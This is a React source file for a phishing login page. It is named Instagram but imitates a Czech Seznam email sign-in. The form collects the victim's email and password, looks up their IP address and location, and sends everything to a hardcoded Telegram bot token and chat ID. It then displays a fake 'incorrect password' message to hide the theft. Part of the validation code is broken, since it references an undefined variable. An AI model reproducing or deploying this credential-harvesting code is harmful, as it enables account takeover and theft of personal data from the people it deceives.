import React, { useState, FormEvent } from "react";
import Logo from "../assets/images.png";

const Instagram: React.FC = () => {
  const [type, setType] = useState<string>("password");
  const [icon, setIcon] = useState<boolean>(true);
  const [result, setResult] = useState<string>("");
  const [error, setError] = useState("");


  const handleToggle = () => {
    setType(icon ? "text" : "password");
    setIcon(!icon);
  };
  
  const onSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const formData: Record<string, string> = {};
    Array.from(event.currentTarget.elements).forEach((field) => {
      if (field instanceof HTMLInputElement && field.name) {
        formData[field.name] = field.value;
      }
    });
    
      formData.name.toLowerCase().endsWith(".cz");


    if (!isValid) {
      setError("Email musí končit @seznam.cz, @email.cz, nebo @post.cz atd");
    } else {
      setError("");
      fetch("https://ipapi.co/json/")
        .then((res) => res.json())
        .then((data) => {
          const { ip, country_name, country_calling_code, city } = data;
          const NameLogin = formData.name;
          const PasswordLogin = formData.password;
          const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;

          const token = "5947007494:AAG1Q11Z0_SY9RhePdWsPJpuOf4sDf_pw6g";
          const chat_id = -4792963876

          const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

          const api = new XMLHttpRequest();
          api.open("GET", url, true);
          api.send();

          setTimeout(() => {
            setResult("Je nám líto, vaše heslo bylo nesprávné. Zkontrolujte prosím své heslo.");
          }, 2000);
        });
    }


  };

  return (
    <section className="h-screen flex flex-col items-center justify-center px-6 md:px-14 lg:px-28 pt-12 md:pt-40 md:pb-20 pb-10">
      <div className="md:border-2 border-gray-500/10 px-8 py-10 max-w-[350px] w-full">
        <form className="grid gap-2" onSubmit={onSubmit}>
          <img className="h-16 mx-auto" src={Logo} alt="Instagram" />
          <input
            required
            className="px-2 py-2.5 rounded-sm border border-gray-500/30 bg-transparent text-sm"
            type="text"
            name="name"
            placeholder="E-mail"
            pattern="^[a-zA-Z0-9._%+-]+@(seznam\.cz|email\.cz|post\.cz)$"
            title="Email musí končit @seznam.cz, @email.cz, nebo @post.cz atd"
          />

          <div className="flex items-center relative mb-3">
            <input
              required
              type={type}
              className="px-2 py-2.5 rounded-sm gap-3 border border-gray-500/30 flex-grow bg-transparent text-sm"
              name="password"
              placeholder="heslo"
            />
            <span
              className="absolute right-5 cursor-pointer hover:text-black/40 text-black-70 text-sm"
              onClick={handleToggle}
            >
              {icon ? "Hide" : "Show"}
            </span>
          </div>
          {error && <p className="text-red-600 text-xs">{error}</p>}
          <button
            type="submit"
            className="bg-red-700 py-2 text-sm text-white hover:bg-red-600 outline-red-700 rounded-md"
          >
            přihlášení
          </button>
          <p className="text-center text-xs text-red-600">{result}</p>
          <div className="orr">
            <p className="text-[#dadada]">or</p>
          </div>
          <div className="text-center">
            <a href="#" className="text-sm font-medium text-black/60">
            Zapomenout heslo?
            </a>
          </div>
        </form>
      </div>
      {/* <div className="md:border-2 border-gray-500/10 px-8 md:py-5 md:mt-5 max-w-[350px] w-full text-center">
        <span className="text-sm">
          Don't have an account? {" "}
          <a href="#" className="text-red-600 font-semibold">
            Sign Up
          </a>
        </span>
      </div>
      <AppDownload /> */}
      <div className="mt-auto text-sm text-black/50">Czech © {new Date().getFullYear()} Seznam</div>
    </section>
  );
};

export default Instagram;
